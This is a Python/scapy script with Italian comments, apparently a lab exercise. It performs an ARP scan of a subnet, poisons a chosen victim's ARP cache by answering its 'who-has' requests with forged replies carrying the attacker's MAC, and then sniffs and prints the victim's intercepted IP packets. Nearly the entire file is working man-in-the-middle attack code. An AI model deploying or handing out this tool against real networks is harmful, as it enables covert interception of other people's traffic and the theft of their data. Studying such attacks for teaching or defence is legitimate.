import time
from colorama import Fore
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sniff, sendp
from scapy.all import send
from scapy.all import get_if_hwaddr

# Imposto il colore delle stampe a video
print(f"{Fore.LIGHTGREEN_EX}", end="")

################################################## ARP SCAN ############################################################

# creo un frame ethernet (livello 2, datalink) inviato in broadcast, contente un pacchetto ARP request per tutti gli indirizzi
# della sottorete 192.168.1.0/24 (i primi 24 bit sono fissi e identificano la sottorete, i restanti 8 bit identificano i 2^8=256 indirizzi differenti)
subnet = input("Please provide subnet address in the following format: aaa.bbb.ccc.ddd/ee\n")
ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)

print("Performing arp scan. Please wait ...")

# invio il frame ethernet costruito, con un tempo di attesa per la risposta di timeout secondi. La variabile ans conterrà le richieste inviate [0]
# con le relative risposte [1]
ans, _ = srp(ethernet_frame, timeout=15, verbose=False, iface="enp0s3")

# ans è un vettore di tuple in cui ciascuna tupla è costituita da due campi: la richiesta inviata [0] e la risposta ricevuta [1]
if ans:
    print("Online hosts:")
    for reply in ans:
        print(f"{Fore.LIGHTCYAN_EX}IP address: " + reply[1].psrc + " - MAC address: " + reply[1].hwsrc + Fore.LIGHTGREEN_EX)
else:
    print("No online hosts found.")
    exit(0)

################################################## ARP POISONING #######################################################

sender_ip_addr = input("Please provide IP address of the host for which you want to sniff arp requests:\n")
sender_mac_addr = input("Please provide MAC address of the host for which you want to sniff arp requests:\n")
MITM_MAC = get_if_hwaddr('enp0s3')  # MAC dell'attaccante
stolen_identities_ip_addr = []  # lista degli indirizzi IP spoofati


# funzione per l'invio delle risposte arp falsificate
def arp_poisoning(sndr_ip_addr, sndr_mac_addr, stolen_ip_addr, mitm_mac_addr):
    # risposta arp contenete come indirizzo fisico quello del MITM
    fake_arp_reply = ARP(op=2, hwsrc=mitm_mac_addr, psrc=stolen_ip_addr, hwdst=sndr_mac_addr, pdst=sndr_ip_addr)
    print(f"{Fore.LIGHTYELLOW_EX}Sending fake arp response assuming the identity " + stolen_ip_addr)
    # invio delle risposte arp
    for i in range(5):
        send(fake_arp_reply)
        time.sleep(0.5)
    stolen_identities_ip_addr.append(stolen_ip_addr)
    print(Fore.WHITE)


print("Sniffing ARP requests from " + sender_ip_addr + " .Please wait...")

# funzione per lo sniffing delle richieste ARP provenienti dall'host specificato
def arp_packet_handler(arp_packet):
    # considero le richieste arp provenienti dall'host precedentemente specificato
    if arp_packet.haslayer(ARP) and arp_packet[ARP].op == 1 and arp_packet[ARP].psrc == sender_ip_addr:

        print(f"{Fore.LIGHTCYAN_EX}" + arp_packet[ARP].psrc + " is sending a 'who-has' request for the host " +
              arp_packet[ARP].pdst + Fore.LIGHTGREEN_EX)
        #Non appena la richiesta arp è catturata, viene subito inviata una risposta ARP
        arp_poisoning(arp_packet[ARP].psrc, arp_packet[ARP].hwsrc, arp_packet[ARP].pdst, MITM_MAC)
        stop = input("Press 'q' to sniff packets or press any key to continue with ARP requests sniffing and poisoning: ")
        if stop.lower() == 'q':
            return True

#sniffing delle richieste arp
sniff(filter="arp", stop_filter=arp_packet_handler, iface="enp0s3")


################################################ IP PACKETS SNIFFING ###################################################
print(f"{Fore.LIGHTGREEN_EX}Sniffing IP packets. Please wait ...")
def packet_handler(packet):
    # Verifica se l'indirizzo IP di destinazione del pacchetto corrisponde a quello dell'identità rubata e se l'indirizzo IP del mittente è quello specifiicato
    if packet.haslayer("IP") and packet["IP"].dst in stolen_identities_ip_addr and packet["IP"].src == sender_ip_addr and packet["Ether"].dst == MITM_MAC:
        print(f"{Fore.LIGHTGREEN_EX}\nIncoming IP message from " + packet["IP"].src + " :")
        print(f"{Fore.LIGHTCYAN_EX}\n")
        print(packet.show())
        print(Fore.WHITE)

# Avvia la cattura dei pacchetti
sniff(prn=packet_handler, iface="enp0s3")
